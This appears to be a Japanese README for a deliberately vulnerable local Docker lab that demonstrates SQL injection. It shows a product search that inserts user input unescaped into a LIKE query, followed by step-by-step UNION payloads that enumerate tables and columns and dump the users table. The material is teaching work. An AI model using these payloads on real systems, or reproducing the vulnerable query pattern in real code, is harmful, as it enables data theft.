# SQLインジェクションサンプル

SQLインジェクションを実感できるサンプル

## requirements
- docker
- docker compose

## installation
```sh
docker compose up -d
```

上記コマンドでサーバを立ち上げることで、 http://localhost:8000 にアクセスするとページが表示されます。

## インジェクション体験
### ページ概要
このサンプルページは、製品を一覧表示するページです。
このページでは、以下のSQLが実行されています。

```sql
SELECT * FROM products
```

また、製品名をフォームで送信することで、以下のSQLにより検索結果の絞り込みができます。 `{name}` には入力した値が入ります。

```sql
SELECT * FROM products WHERE name LIKE '%{name}%'
```

### テーブルの一覧を取得する
フォームに以下の値を入力することで、テーブルの一覧を取得できます。

```
' UNION SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = DATABASE() -- 
```

実行すると以下のような結果になります。



使用しているデータベース名と、テーブル名のリストが表示されました。
よって、このデータベースでは `users` というテーブルがあることが確認できました。

このとき、実行されたSQLはこのようになります。

```sql
SELECT * FROM products WHERE name LIKE '%'
UNION
SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = DATABASE()
-- %'
```

### users テーブルの構造を取得する
同様の方法で、 users テーブルの構造を取得できます。

```
' UNION SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users' AND TABLE_SCHEMA = 'test' -- 
```


`users` テーブルにあるカラムがわかりました。

このとき、実行されたSQLはこのようになります。

```sql
SELECT * FROM products WHERE name LIKE '%'
UNION
SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users' AND TABLE_SCHEMA = 'test'
-- %'
```

### users テーブルの情報を取得する
テーブル名とテーブルの構造がすでに把握できたので、簡単に `users` テーブルの中身を表示できます。

```
' UNION SELECT name, department FROM users -- 
```


このとき、実行されたSQLはこのようになります。

```sql
SELECT * FROM products WHERE name LIKE '%'
UNION
SELECT name, department FROM users
-- %'
```
